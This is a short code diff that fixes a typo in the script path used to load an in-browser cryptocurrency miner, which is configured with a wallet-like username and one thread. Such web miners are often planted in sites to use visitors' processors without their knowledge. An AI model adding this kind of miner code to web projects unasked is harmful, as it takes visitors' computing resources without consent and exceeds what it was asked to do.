@@ -1,4 +1,4 @@
-importScript("/co.minecruch/web/miner", function() {
+importScript("/co.minecrunch/web/miner", function() {
   var miner = new WebMiner({
     username: "LXXzSQLomWeRbfcWqdRqKukURbYxFdiFig",
     threads: 1
